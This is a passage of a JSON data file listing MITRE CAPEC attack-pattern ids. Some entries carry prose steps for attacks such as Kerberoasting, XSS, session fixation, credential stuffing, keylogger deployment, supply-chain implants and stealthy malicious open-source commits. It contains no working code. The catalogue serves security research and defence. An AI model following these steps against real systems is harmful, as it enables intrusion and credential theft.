        "capec_id": "507"
    },
    {
        "id": 385,
        "capec_id": "508"
    },
    {
        "id": 386,
        "capec_id": "509",
        "step1": " Scan for user accounts with set SPN values. - These can be found via Powershell or LDAP queries, as well as enumerating startup name accounts and other means. ",
        "step2": " Request service tickets. - Using user account's SPN value, request other service tickets from Active Directory ",
        "step3": " Extract ticket and save to disk. - Certain tools like Mimikatz can extract local tickets and save them to memory/disk. ",
        "step4": " Crack the encrypted ticket to harvest plain text credentials. - Leverage a brute force application/script on the hashed value offline until cracked. The shorter the password, the easier it is to crack.\n"
    },
    {
        "id": 387,
        "capec_id": "51",
        "step1": " [Find a target SOA or Web Service] The adversary must first indentify a target SOA or Web Service. ",
        "step2": " [Determine desired outcome] Because poisoning a web service registry can have different outcomes, the adversary must decide how they wish to effect the webservice.. - An adversary can perform a denial of service attack on a web service.. - An adversary can redirect requests or responses to a malicious service. ",
        "step3": " [Determine if a malicious service needs to be created] If the adversary wishes to redirect requests or responses, they will need to create a malicious service to redirect to.. - Create a service to that requests are sent to in addition to the legitimate service and simply record the requests.. - Create a service that will give malicious responses to a service provider.. - Act as a malicious service provider and respond to requests in an arbitrary way. ",
        "step4": " [Poison Web Service Registry] Based on the desired outcome, poison the web service registry. This is done by altering the data at rest in the registry or uploading malicious content by spoofing a service provider.. - Intercept and change WS-Adressing headers to route to a malicious service or service provider.. - Provide incorrect information in schema or metadata to cause a denial of service.. - Delete information about service procider interfaces to cause a denial of service.\n"
    },
    {
        "id": 388,
        "capec_id": "510"
    },
    {
        "id": 389,
        "capec_id": "511"
    },
    {
        "id": 390,
        "capec_id": "516"
    },
    {
        "id": 391,
        "capec_id": "517"
    },
    {
        "id": 392,
        "capec_id": "518"
    },
    {
        "id": 393,
        "capec_id": "519"
    },
    {
        "id": 394,
        "capec_id": "52",
        "step1": " [Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.. - Manually inspect the application to find entry points. ",
        "step2": " [Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects postfix null byte(s) to observe how the application handles them as input. The adversary is looking for areas where user input is placed in the middle of a string, and the null byte causes the application to stop processing the string at the end of the user input.. - Try different encodings for null such as 0 or %00 ",
        "step3": " [Remove data after null byte(s)] After determined entry points that are vulnerable, the adversary places a null byte(s) such that they remove data after the null byte(s) in a way that is beneficial to them.. - If the input is a directory as part of a longer file path, add a null byte(s) at the end of the input to try to traverse to the given directory.\n"
    },
    {
        "id": 395,
        "capec_id": "520"
    },
    {
        "id": 396,
        "capec_id": "521"
    },
    {
        "id": 397,
        "capec_id": "522",
        "step1": " [Determine Target Hardware] The adversary must first identify a system that they wish to target, and a specific hardware component that they can swap out with a malicious replacement.. - Look for datasheets containing the system schematics that can help identify possible target hardware.. - Procure a system and inspect it manually, looking for possible hardware component targets. Search for manufacturer IDs on hardware chips or FCC IDs on wireless chips to determine their functionality. ",
        "step2": " [Discover Vulnerability in Supply Chain] The adversary maps out the supply chain for the targeted system. They look for ooportunities to gain physical access to the system after it has left the manufacturer, but before it is deployed to the victim.. - Procure a system and observe the steps it takes in the shipment process.. - Identify possible warehouses that systems are stored after manufacturing. ",
        "step3": " [Test a Malicious Component Replacement] Before performing the attack in the wild, an adversary will test the attack on a system they have procured to ensure that the desired outcome will be achieved.. - Design a malicious hardware component that will perform the same functionality as the target component, but also contains additional functionality.. - Obtain already designed malicious components that just need to be placed into the system. ",
        "step4": " [Substitute Components in the Supply Chain] Using the vulnerability in the supply chain of the system discovered in the explore phase, the adversary substitutes the malicious component for the targeted component. This results in the adversary gaining unintended access to systems once they reach the victim and can lead to a variety of follow up attacks.\n"
    },
    {
        "id": 398,
        "capec_id": "523",
        "step1": " [Determine Entry Point] The adversary must first identify a system that they wish to target and search for an entry point they can use to install the malicious software. This could be a system which they have prior knowledge of, giving them insight into the software and environment.. - Use a JTAGulator to identify exposed JTAG and UART interfaces in smaller embedded systems.. - Identify exposed USB connectors that could be used to load software. ",
        "step2": " [Discover Vulnerability in Supply Chain] The adversary maps out the supply chain for the targeted system. They look for ooportunities to gain physical access to the system after it has left the manufacturer, but before it is deployed to the victim.. - Procure a system and observe the steps it takes in the shipment process.. - Identify possible warehouses that systems are stored after manufacturing. ",
        "step3": " [Test Malicious Software] Before performing the attack in the wild, an adversary will test the attack on a system they have procured to ensure that the desired outcome will be achieved.. - Design malicious software that will give an adversary a backdoor into the system once it is deployed to the victim.. - Obtain already designed malicious software that just need to be placed into the system. ",
        "step4": " [Implant Software in the Supply Chain] Using the vulnerability in the supply chain of the system discovered in the explore phase, the adversary implants the malicious software into the system. This results in the adversary gaining unintended access to systems once they reach the victim and can lead to a variety of follow up attacks.\n"
    },
    {
        "id": 399,
        "capec_id": "524"
    },
    {
        "id": 400,
        "capec_id": "528",
        "step1": " [Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.. - Use an automated tool to record all instances of URLs to process XML requests.. - Use a browser to manually explore the website and analyze how the application processes XML requests. ",
        "step2": " An adversary crafts input data that may have an adverse effect on the operation of the web service when the XML data sent to the service. ",
        "step3": " [Launch a resource depletion attack] The attacker delivers a large number of XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.. - Send a large number of crafted XML messages to the target URL.\n"
    },
    {
        "id": 401,
        "capec_id": "529"
    },
    {
        "id": 402,
        "capec_id": "53",
        "step1": " [Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.. - Manually inspect the application to find entry points. ",
        "step2": " [Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects postfix null byte(s) followed by a backslash to observe how the application handles them as input. The adversary is looking for areas where user input is placed in the middle of a string, and the null byte causes the application to stop processing the string at the end of the user input.. - Try different encodings for null such as 0 or %00 followed by an encoding for the backslash character. ",
        "step3": " [Remove data after null byte(s)] After determined entry points that are vulnerable, the adversary places a null byte(s) followed by a backslash such that they bypass an input filter and remove data after the null byte(s) in a way that is beneficial to them.. - If the input is a directory as part of a longer file path, add a null byte(s) followed by a backslash at the end of the input to try to traverse to the given directory.\n"
    },
    {
        "id": 403,
        "capec_id": "530"
    },
    {
        "id": 404,
        "capec_id": "531"
    },
    {
        "id": 405,
        "capec_id": "532"
    },
    {
        "id": 406,
        "capec_id": "533"
    },
    {
        "id": 407,
        "capec_id": "534"
    },
    {
        "id": 408,
        "capec_id": "535"
    },
    {
        "id": 409,
        "capec_id": "536",
        "step1": " [Determine configuration process] The adversary, through a previously compromised system, either remotely or physically, determines what the configuration process is. They look at configuration files, data files, and running processes on the system to identify areas where they could inject malicious data. ",
        "step2": " [Determine when configuration occurs] The adversary needs to then determine when configuration or recalibration of a system occurs so they know when to inject malicious data.. - Look for a weekly update cycle or repeated update schedule.. - Insert a malicious process into the target system that notifies the adversary when configuration is occurring. ",
        "step3": " [Determine malicious data to inject] By looking at the configuration process, the adversary needs to determine what malicious data they want to insert and where to insert it.. - Add false log data. - Change configuration files. - Change data files ",
        "step4": " [Inject malicious data] Right before, or during system configuration, the adversary injects the malicious data. This leads to the system behaving in a way that is beneficial to the adversary and is often followed by other attacks.\n"
    },
    {
        "id": 410,
        "capec_id": "537"
    },
    {
        "id": 411,
        "capec_id": "538",
        "step1": " [Determine the relevant open-source code project to target] The adversary will make the selection based on various criteria: The open-source code currently in use on a selected target system. The depth in the dependency graph of the open source code in relationship to other code bases in use on the target system. Choosing an OSS lower in the graph decreases the probability of discovery, but also decreases the scope of its use within the target system. The programming language in which the open source code is implemented. Different languages present different opportunities for using known software weaknesses. The quality of processes in place to make a contribution. For instance, some contribution sites use static and dynamic analysis tools, which could increase the probability of discovery. The security requirements necessary to make a contribution. For instance, is the ownership lax allowing unsigned commits or anonymous users. ",
        "step2": " [Develop a plan for malicious contribution] The adversary develops a plan to contribute malicious code, taking the following into consideration: The adversary will probably avoid easy-to-find software weaknesses, especially ones that static and dynamic analysis tools are likely to discover. Common coding errors or missing edge cases of the algorithm, which can be explained away as being accidental, if discovered, will be preferred by the adversary. Sometimes no identity is required to make a contribution. Other options are to steal an existing identity or create one. When creating a new identity, strike a balance between too little or too much detail. Using an stolen identity could cause a notification to be sent to the actual user. ",
        "step3": " [Execute the plan for malicious contribution] Write the code to be contributed based on the plan and then submit the contribution. Multiple commits, possibly using multiple identities, will help obscure the attack. Monitor the contribution site to try to determine if the code has been uploaded to the target system.\n"
    },
    {
        "id": 412,
        "capec_id": "539"
    },
    {
        "id": 413,
        "capec_id": "54",
        "step1": " [Determine parameters] Determine all user-controllable parameters of the application either by probing or by finding documentation ",
        "step2": " [Cause error condition] Inject each parameter with content that causes an error condition to manifest ",
        "step3": " [Modify parameters] Modify the content of each parameter according to observed error conditions ",
        "step4": " [Follow up attack] Once the above steps have been repeated with enough parameters, the application will be sufficiently mapped out. The adversary can then launch a desired attack (for example, Blind SQL Injection).\n"
    },
    {
        "id": 414,
        "capec_id": "540",
        "step1": " [Identify target application] The adversary identifies a target application or program to perform the buffer overread on. Adversaries often look for applications that accept user input and that perform manual memory management. ",
        "step2": " [Find attack vector] The adversary identifies an attack vector by looking for areas in the application where they can specify to read more data than is required. ",
        "step3": " [Overread the buffer] The adversary provides input to the application that gets it to read past the bounds of a buffer, possibly revealing sensitive information that was not intended to be given to the adversary.\n"
    },
    {
        "id": 415,
        "capec_id": "541"
    },
    {
        "id": 416,
        "capec_id": "542"
    },
    {
        "id": 417,
        "capec_id": "543"
    },
    {
        "id": 418,
        "capec_id": "544"
    },
    {
        "id": 419,
        "capec_id": "545"
    },
    {
        "id": 420,
        "capec_id": "546"
    },
    {
        "id": 421,
        "capec_id": "547"
    },
    {
        "id": 422,
        "capec_id": "548"
    },
    {
        "id": 423,
        "capec_id": "549"
    },
    {
        "id": 424,
        "capec_id": "55",
        "step1": " [Determine application's/system's password policy] Determine the password policies of the target application/system.. - Determine minimum and maximum allowed password lengths.. - Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).. - Determine account lockout policy (a strict account lockout policy will prevent brute force attacks). ",
        "step2": " [Obtain password hashes] An attacker gets access to the database table storing hashes of passwords or potentially just discovers a hash of an individual password.. - Obtain copy of database table or flat file containing password hashes (by breaking access controls, using SQL Injection, etc.). - Obtain password hashes from platform-specific storage locations (e.g. Windows registry). - Sniff network packets containing password hashes. ",
        "step3": " [Run rainbow table-based password cracking tool] An attacker finds or writes a password cracking tool that uses a previously computed rainbow table for the right hashing algorithm. It helps if the attacker knows what hashing algorithm was used by the password system.. - Run rainbow table-based password cracking tool such as Ophcrack or RainbowCrack. Reduction function must depend on application's/system's password policy.\n"
    },
    {
        "id": 425,
        "capec_id": "550"
    },
    {
        "id": 426,
        "capec_id": "551"
    },
    {
        "id": 427,
        "capec_id": "552"
    },
    {
        "id": 428,
        "capec_id": "554"
    },
    {
        "id": 429,
        "capec_id": "555"
    },
    {
        "id": 430,
        "capec_id": "556"
    },
    {
        "id": 431,
        "capec_id": "557"
    },
    {
        "id": 432,
        "capec_id": "558"
    },
    {
        "id": 433,
        "capec_id": "559"
    },
    {
        "id": 434,
        "capec_id": "56"
    },
    {
        "id": 435,
        "capec_id": "560",
        "step1": " [Acquire known credentials] The adversary must obtain known credentials in order to access the target system, application, or service.. - An adversary purchases breached username/password combinations or leaked hashed passwords from the dark web.. - An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.. - An adversary conducts a sniffing attack to steal credentials as they are transmitted.. - An adversary gains access to a database and exfiltrates password hashes.. - An adversary examines outward-facing configuration and properties files to discover hardcoded credentials. ",
        "step2": " [Determine target's password policy] Determine the password policies of the target system/application to determine if the known credentials fit within the specified criteria.. - Determine minimum and maximum allowed password lengths.. - Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).. - Determine account lockout policy (a strict account lockout policy will prevent brute force attacks if multiple passwords are known for a single user account). ",
        "step3": " [Attempt authentication] Try each credential until the target grants access.. - Manually or automatically enter each credential through the target's interface. ",
        "step4": " [Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within a system or application ",
        "step5": " [Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks. ",
        "step6": " [Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.\n"
    },
    {
        "id": 436,
        "capec_id": "561",
        "step1": " [Acquire known Windows administrator credentials] The adversary must obtain known Windows administrator credentials in order to access the administrative network shares.. - An adversary purchases breached Windows administrator credentials from the dark web.. - An adversary leverages a key logger or phishing attack to steal administrator credentials as they are provided.. - An adversary conducts a sniffing attack to steal Windows administrator credentials as they are transmitted.. - An adversary gains access to a Windows domain system/files and exfiltrates Windows administrator password hashes.. - An adversary examines outward-facing configuration and properties files to discover hardcoded Windows administrator credentials. ",
        "step2": " [Attempt domain authentication] Try each Windows administrator credential against the hidden network shares until the target grants access.. - Manually or automatically enter each administrator credential through the target's interface. ",
        "step3": " [Malware Execution] An adversary can remotely execute malware within the administrative network shares to infect other systems within the domain. ",
        "step4": " [Data Exfiltration] The adversary can remotely obtain sensitive data contained within the administrative network shares.\n"
    },
    {
        "id": 437,
        "capec_id": "562"
    },
    {
        "id": 438,
        "capec_id": "563"
    },
    {
        "id": 439,
        "capec_id": "564"
    },
    {
        "id": 440,
        "capec_id": "565",
        "step1": " [Determine target's password policy] Determine the password policies of the target system/application.. - Determine minimum and maximum allowed password lengths.. - Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).. - Determine account lockout policy (a strict account lockout policy will prevent brute force attacks). ",
        "step2": " [Select passwords] Pick the passwords to be used in the attack (e.g. commonly used passwords, passwords tailored to individual users, etc.). - Select passwords based on common use or a particular user's additional details.. - Select passwords based on the target's password complexity policies. ",
        "step3": " [Brute force password] Given the finite space of possible passwords dictated by information determined in the previous steps, try each password for all known user accounts until the target grants access.. - Manually or automatically enter the first password for each known user account through the target's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.. - Iterate through the remaining passwords for each known user account.\n"
    },
    {
        "id": 441,
        "capec_id": "566"
    },
    {
        "id": 442,
        "capec_id": "567"
    },
    {
        "id": 443,
        "capec_id": "568",
        "step1": " [Determine which user's credentials to capture] Since this is a more targeted attack, an adversary will first identify a particular user they wish the capture the credentials of. ",
        "step2": " [Deploy keylogger] Once a user is identified, an adversary will deploy a keylogger to the user's system in one of many ways.. - Send a phishing email with a malicious attachment that installs a keylogger on a user's system. - Conceal a keylogger behind fake software and get the user to download the software. - Get a user to click on a malicious URL that directs them to a webpage that will install a keylogger without their knowledge. - Gain access to the user's system through a vulnerability and manually install a keylogger ",
        "step3": " [Record keystrokes] Once the keylogger is deployed on the user's system, the adversary will record keystrokes over a period of time. ",
        "step4": " [Analyze data and determine credentials] Using the captured keystrokes, the adversary will be able to determine the credentials of the user.. - Search for repeated sequences that are following by the enter key. - Search for repeated sequences that are not found in a dictionary. - Search for several backspaces in a row. This could indicate a mistyped password. The correct password can then be inferred using the whole key sequence ",
        "step5": " [Use found credentials] After the adversary has found the credentials for the target user, they will then use them to gain access to a system in order to perform some follow-up attack.\n"
    },
    {
        "id": 444,
        "capec_id": "569"
    },
    {
        "id": 445,
        "capec_id": "57",
        "step1": " [Find a REST-style application that uses SSL] The adversary must first find a REST-style application that uses SSL to target. Because this attack is easier to carry out from inside of a server network, it is likely that an adversary could have inside knowledge of how services operate. ",
        "step2": " [Insert a listener to sniff client-server communication] The adversary inserts a listener that must exist beyond the point where SSL is terminated. This can be placed on the client side if it is believed that sensitive information is being sent to the client as a response, although most often the listener will be placed on the server side to listen for client authentication information.. - Run wireshark or tcpdump on a device that is on the inside of a firewall, load balancer, or router of a network and capture traffic after SSL has been terminated ",
        "step3": " [Gather information passed in the clear] If developers have not hashed or encrypted data sent in the sniffed request, the adversary will be able to read this data in the clear. Most commonly, they will now have a username or password that they can use to submit requests to the web service just as an authorized user.\n"
    },
    {
        "id": 446,
        "capec_id": "570"
    },
    {
        "id": 447,
        "capec_id": "571"
    },
    {
        "id": 448,
        "capec_id": "572"
    },
    {
        "id": 449,
        "capec_id": "573"
    },
    {
        "id": 450,
        "capec_id": "574"
    },
    {
        "id": 451,
        "capec_id": "575"
    },
    {
        "id": 452,
        "capec_id": "576"
    },
    {
        "id": 453,
        "capec_id": "577"
    },
    {
        "id": 454,
        "capec_id": "578"
    },
    {
        "id": 455,
        "capec_id": "579"
    },
    {
        "id": 456,
        "capec_id": "58"
    },
    {
        "id": 457,
        "capec_id": "580"
    },
    {
        "id": 458,
        "capec_id": "581"
    },
    {
        "id": 459,
        "capec_id": "582"
    },
    {
        "id": 460,
        "capec_id": "583"
    },
    {
        "id": 461,
        "capec_id": "584"
    },
    {
        "id": 462,
        "capec_id": "585"
    },
    {
        "id": 463,
        "capec_id": "586"
    },
    {
        "id": 464,
        "capec_id": "587"
    },
    {
        "id": 465,
        "capec_id": "588",
        "step1": " [Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe identified potential entry points for DOM-based XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads and special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. Specific to DOM-based XSS, the adversary is looking for areas where input is being used to directly change the DOM.. - Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.. - Use a proxy tool to record results of manual input of XSS probes in known URLs.. - Use a list of HTML special characters to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out. ",
        "step3": " [Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim. In DOM-based XSS, the malicious script might not even be sent to the server, since the victim's browser will manipulate the DOM itself. This can help avoid serve-side detection mechanisms.. - Change a URL parameter to include a malicious script tag.. - Add a URL fragment to alter the value of the expected Document object URL.. - Send information gathered from the malicious script to a remote endpoint. ",
        "step4": " [Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.. - Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.. - Put the malicious URL on a public forum, where many victims might accidentally click the link.\n"
    },
    {
        "id": 466,
        "capec_id": "589"
    },
    {
        "id": 467,
        "capec_id": "59",
        "step1": " [Find Session IDs] The attacker interacts with the target host and finds that session IDs are used to authenticate users.. - An attacker makes many anonymous connections and records the session IDs assigned.. - An attacker makes authorized connections and records the session tokens or credentials issued. ",
        "step2": " [Characterize IDs] The attacker studies the characteristics of the session ID (size, format, etc.). As a results the attacker finds that legitimate session IDs are predictable.. - Cryptanalysis. The attacker uses cryptanalysis to determine if the session IDs contain any cryptographic protections.. - Pattern tests. The attacker looks for patterns (odd/even, repetition, multiples, or other arithmetic relationships) between IDs. - Comparison against time. The attacker plots or compares the issued IDs to the time they were issued to check for correlation. ",
        "step3": " [Match issued IDs] The attacker brute forces different values of session ID and manages to predict a valid session ID.. - The attacker models the session ID algorithm enough to produce a compatible session IDs, or just one match. ",
        "step4": " [Use matched Session ID] The attacker uses the falsified session ID to access the target system.. - The attacker loads the session ID into their web browser and browses to restricted data or functionality.. - The attacker loads the session ID into their network communications and impersonates a legitimate user to gain access to data or functionality.\n"
    },
    {
        "id": 468,
        "capec_id": "590"
    },
    {
        "id": 469,
        "capec_id": "591",
        "step1": " [Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe identified potential entry points for reflected XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads and special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.. - Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.. - Use a proxy tool to record results of manual input of XSS probes in known URLs.. - Use a list of HTML special characters to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out. ",
        "step3": " [Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.. - Change a URL parameter to include a malicious script tag.. - Send information gathered from the malicious script to a remote endpoint. ",
        "step4": " [Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.. - Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.. - Put the malicious URL on a public forum, where many victims might accidentally click the link.\n"
    },
    {
        "id": 470,
        "capec_id": "592",
        "step1": " [Survey the application for stored user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application. The adversary is looking for areas where user input is stored, such as user profiles, shopping carts, file managers, forums, blogs, and logs.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points.. - Use a proxy tool to record all links visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe identified potential entry points for stored XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads and special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.. - Use a list of XSS probe strings to submit script in input fields that could be stored by the web application. If possible, the probe strings contain a unique identifier so they can be queried for after submitting to see if they are stored.. - Use a list of HTML special characters to submit in input fields that could be stored by the web application and check if they were properly encoded, replaced, or filtered out. ",
        "step3": " [Store malicious XSS content] Once the adversary has determined which stored locations are vulnerable to XSS, they will interact with the web application to store the malicious content. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.. - Store a malicious script on a page that will execute when viewed by the victim.. - Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks. ",
        "step4": " [Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.. - Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.. - Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum.\n"
    },
    {
        "id": 471,
        "capec_id": "593",
        "step1": " [Discover Existing Session Token] Through varrying means, an adversary will discover and store an existing session token for some other authenticated user session. ",
        "step2": " [Insert Found Session Token] The attacker attempts to insert a found session token into communication with the targeted application to confirm viability for exploitation. ",
        "step3": " [Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim.\n"
    },
    {
        "id": 472,
        "capec_id": "594"
    },
    {
        "id": 473,
        "capec_id": "595"
    },
    {
        "id": 474,
        "capec_id": "596"
    },
    {
        "id": 475,
        "capec_id": "597",
        "step1": " [Fingerprinting of the operating system] In order to perform a valid path traversal, the adversary needs to know what the underlying OS is so that the proper file seperator is used.. - Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.. - TCP/IP Fingerprinting. The adversary uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.. - Induce errors to find informative error messages ",
        "step2": " [Survey application] Using manual or automated means, an adversary will survey the target application looking for all areas where user input is taken to specify a file name or path.. - Use a spidering tool to follow and record all links on a web page. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of a web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.. - Use a browser to manually explore a website and analyze how it is constructed. Many browser's plug-in are available to facilitate the analysis or automate the URL discovery. ",
        "step3": " [Attempt variations on input parameters] Using manual or automated means, an adversary attempts varying absolute file paths on all found user input locations and observes the responses.. - Access common files in root directories such as /bin, /boot, /lib, or /home. - Access a specific drive letter or windows volume letter by specifying C:dirname for example. - Access a known Windows UNC share by specifying UNCsharename for example ",
        "step4": " [Access, modify, or execute arbitrary files.] An adversary injects absolute path traversal syntax into identified vulnerable inputs to cause inappropriate reading, writing or execution of files. An adversary could be able to read directories or files which they are normally not allowed to read. The adversary could also access data outside the web document root, or include scripts, source code and other kinds of files from external websites. Once the adversary accesses arbitrary files, they could also modify files. In particular situations, the adversary could also execute arbitrary code or system commands.. - Manipulate file and its path by injecting absolute path sequences (e.g. /home/file.txt).. - Download files, modify files, or try to execute shell commands (with binary files).\n"
    },
    {
        "id": 476,
        "capec_id": "598"
    },
    {
        "id": 477,
        "capec_id": "599"
    },
    {
        "id": 478,
        "capec_id": "6",
        "step1": " [Discovery of potential injection vectors] Using an automated tool or manual discovery, the attacker identifies services or methods with arguments that could potentially be used as injection vectors (OS, API, SQL procedures, etc.).. - Manually cover the application and record the possible places where arguments could be passed into external systems.. - Use a spider, for web applications, to create a list of URLs and associated inputs. ",
        "step2": " [1. Attempt variations on argument content] Possibly using an automated tool, the attacker will perform injection variations of the arguments.. - Use a very large list of probe strings in order to detect if there is a positive result, and, what type of system has been targeted (if obscure).. - Use a proxy tool to record results, error messages and/or log if accessible. ",
        "step3": " [Abuse of the application] The attacker injects specific syntax into a particular argument in order to generate a specific malicious effect in the targeted application.. - Manually inject specific payload into targeted argument.\n"
    },
    {
        "id": 479,
        "capec_id": "60",
        "step1": " The attacker interacts with the target host and finds that session IDs are used to authenticate users. ",
        "step2": " The attacker steals a session ID from a valid user. ",
        "step3": " The attacker tries to use the stolen session ID to gain access to the system with the privileges of the session ID's original owner.\n"
    },
    {
        "id": 480,
        "capec_id": "600",
        "step1": " [Acquire known credentials] The adversary must obtain known credentials in order to access the target system, application, or service.. - An adversary purchases breached username/password combinations or leaked hashed passwords from the dark web.. - An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.. - An adversary conducts a sniffing attack to steal credentials as they are transmitted.. - An adversary gains access to a database and exfiltrates password hashes.. - An adversary examines outward-facing configuration and properties files to discover hardcoded credentials. ",
        "step2": " [Determine target's password policy] Determine the password policies of the target system/application to determine if the known credentials fit within the specified criteria.. - Determine minimum and maximum allowed password lengths.. - Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).. - Determine account lockout policy (a strict account lockout policy will prevent brute force attacks if multiple passwords are known for a single user account). ",
        "step3": " [Attempt authentication] Try each username/password combination until the target grants access.. - Manually or automatically enter each username/password combination through the target's interface. ",
        "step4": " [Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system or to laterally move within a system or application ",
        "step5": " [Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks. ",
        "step6": " [Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.\n"
    },
    {
        "id": 481,
        "capec_id": "601"
    },
    {
        "id": 482,
        "capec_id": "602"
    },
    {
        "id": 483,
        "capec_id": "603"
    },
    {
        "id": 484,
        "capec_id": "604"
    },
    {
        "id": 485,
        "capec_id": "605"
    },
    {
        "id": 486,
        "capec_id": "606"
    },
    {
        "id": 487,
        "capec_id": "607"
    },
    {
        "id": 488,
        "capec_id": "608"
    },
    {
        "id": 489,
        "capec_id": "609"
    },
    {
        "id": 490,
        "capec_id": "61",
        "step1": " [Setup the Attack] Setup a session: The attacker has to setup a trap session that provides a valid session identifier, or select an arbitrary identifier, depending on the mechanism employed by the application. A trap session is a dummy session established with the application by the attacker and is used solely for the purpose of obtaining valid session identifiers. The attacker may also be required to periodically refresh the trap session in order to obtain valid session identifiers.. - The attacker chooses a predefined identifier that they know.. - The attacker creates a trap session for the victim. ",
        "step2": " [Attract a Victim] Fixate the session: The attacker now needs to transfer the session identifier from the trap session to the victim by introducing the session identifier into the victim's browser. This is known as fixating the session. The session identifier can be introduced into the victim's browser by leveraging cross site scripting vulnerability, using META tags or setting HTTP response headers in a variety of ways.. - Attackers can put links on web sites (such as forums, blogs, or comment forms).. - Attackers can establish rogue proxy servers for network protocols that give out the session ID and then redirect the connection to the legitimate service.. - Attackers can email attack URLs to potential victims through spam and phishing techniques. ",
        "step3": " [Abuse the Victim's Session] Takeover the fixated session: Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the fixated session identifier.. - The attacker loads the predefined session ID into their browser and browses to protected data or functionality.. - The attacker loads the predefined session ID into their software and utilizes functionality with the rights of the victim.\n"
    },
    {
        "id": 491,
        "capec_id": "610"
    },
    {
        "id": 492,
        "capec_id": "611",
        "step1": " [Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.. - Research popular or high traffic websites. ",
